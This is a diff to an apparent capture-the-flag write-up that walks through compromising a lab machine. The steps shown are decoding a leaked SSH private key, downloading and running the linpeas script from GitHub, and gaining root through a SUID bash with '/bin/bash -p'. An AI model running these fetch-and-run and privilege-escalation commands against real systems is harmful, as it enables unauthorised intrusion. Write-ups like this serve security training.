@@ -29,9 +29,9 @@ After that we've some directories we've tested the common robots.txt which tells
 	
 	output -> /secret.txt
   
-This seems like an interesting place to visit, after that we've got a text seems like a base64 encoded file with the equal the end first guess i thought let's decoded it
+This seems like an interesting place to visit, after that we've got a text seems like a base64 encoded file with the equal sign the end first guess i thought let's decoded it
  
-	wget ip_add/secret.txt | cat secret.txt | base64 -d > ssh_key.txt 
+	wget ip_add/secret.txt ; cat secret.txt ; base64 -d > ssh_key.txt 
  
 This is actually a private key and based on our previous scan we've noticed a port for ssh connection 22 
  
@@ -44,17 +44,17 @@ Bingo we've login and we've got our first flag called local;
 
 Let's scan with a tool just trying to search for possible and available exploits i'm using Linpeas :
 
-	wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh ; chmod +x linpeas.sh | ./linepeas 
+	wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh ; chmod +x linpeas.sh ; ./linepeas 
 
 though the scan of Linepeas we've noticed a suid in the bash builtin command (indicates that the file has the setuid bit set) which means we can gain access through a ;
 
 	/bin/bash -p
 	whoami 
 	
-	with the -p option through some googling it turns up it's a bug that allows the default shell to run with SUID privileges meaning that we have permission to run with the owner privilege
+with the -p option through some googling it turns up it's a bug that allows the default shell to run with SUID privileges meaning that we have permission to run with the owner privilege
 
 
-I gain access and I become a root
+I gain access and i become a root
 
 	cd /root/ ; cat proof.txt
 	
